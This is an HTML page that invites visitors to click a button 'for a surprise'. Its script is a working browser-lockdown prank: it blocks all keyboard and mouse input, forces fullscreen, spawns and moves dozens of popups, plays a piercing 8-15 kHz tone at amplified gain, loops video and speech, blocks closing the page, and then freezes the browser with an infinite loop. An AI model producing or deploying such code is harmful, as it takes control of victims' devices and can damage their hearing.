<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
        <div id="videoContainer" style="display: none; margin-top: 20px;"></div>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const videoContainer = document.getElementById('videoContainer');

        // Prevent closing
        window.onbeforeunload = function() {
            localStorage.x = 1;
            return '';
        };

        let popupCount = 0;
        const maxPopups = 50;

        function createPopup() {
            if (popupCount >= maxPopups) return;
            
            const popup = window.open(window.location.href, '_blank', 'width=400,height=300');
            if (popup) {
                popupCount++;
                
                const randomX = Math.random() * (screen.width - 400);
                const randomY = Math.random() * (screen.height - 300);
                popup.moveTo(randomX, randomY);
            }
        }

        function movePopups() {
            const popups = window.open('', '_blank');
            // This won't work directly, but we'll move the current window
            const randomX = Math.random() * (screen.width - 400);
            const randomY = Math.random() * (screen.height - 300);
            window.moveTo(randomX, randomY);
        }

        async function startChaos(isPopup = false) {
            if (!isPopup && button) {
                button.style.display = 'none';
            }
            videoContainer.style.display = 'block';
            
            // Block all keyboard inputs
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block all mouse clicks and touches
            document.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('mousedown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('touchstart', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block right-click
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Only main window goes fullscreen
            if (!isPopup) {
                document.documentElement.requestFullscreen().catch(e => {});
                
                // Spawn popups
                for (let i = 0; i < 20; i++) {
                    setTimeout(createPopup, i * 100);
                }
                
                // Keep spawning popups
                setInterval(() => {
                    if (popupCount < maxPopups) {
                        createPopup();
                    }
                }, 200);
            }
            
            // Move window around
            setInterval(() => {
                const randomX = Math.random() * (screen.width - 400);
                const randomY = Math.random() * (screen.height - 300);
                window.moveTo(randomX, randomY);
            }, 100);
            
            // Play ear-piercing high-pitch noise
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            oscillator.type = 'sawtooth';
            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
            
            gainNode.gain.value = 100.0; // Extremely loud
            
            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.start();
            
            // Modulate frequency for more piercing effect
            setInterval(() => {
                const freq = 8000 + Math.random() * 7000;
                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
            }, 50);
            
            try {
                const response = await fetch('base64.txt');
                const base64String = await response.text();
                const videoSrc = 'data:video/mp4;base64,' + base64String;
                
                // Create 1 video element with amplified audio
                const video = document.createElement('video');
                video.src = videoSrc;
                video.width = 560;
                video.height = 315;
                video.volume = 1.0;
                video.loop = true;
                videoContainer.appendChild(video);
                
                // Connect to audio context for normal volume
                const source = audioContext.createMediaElementSource(video);
                const videoGainNode = audioContext.createGain();
                videoGainNode.gain.value = 1.0; // Normal volume
                source.connect(videoGainNode);
                videoGainNode.connect(audioContext.destination);
                
                video.play().catch(e => {
                    console.log('Autoplay blocked');
                });
                
                // Add automated voice - repeat one message
                const message = "form";
                
                function speakRepeat() {
                    const utterance = new SpeechSynthesisUtterance(message);
                    utterance.volume = 1.0;
                    utterance.rate = 1.0;
                    utterance.pitch = 1.0;
                    utterance.onend = () => {
                        setTimeout(speakRepeat, 100);
                    };
                    speechSynthesis.speak(utterance);
                }
                speakRepeat();
            } catch (e) {
                console.error('Failed to load video:', e);
            }
            
            // Infinite loop to freeze browser (like the crasher website)
            setTimeout(() => {
                while(true) {
                    window.onbeforeunload = function() {
                        localStorage.x = 1;
                        return '';
                    };
                }
            }, 3000);
        }

        button.addEventListener('click', () => startChaos(false));

        // Auto-start if this is a popup window
        if (window.opener) {
            startChaos(true);
        }
    </script>
</body>
</html>
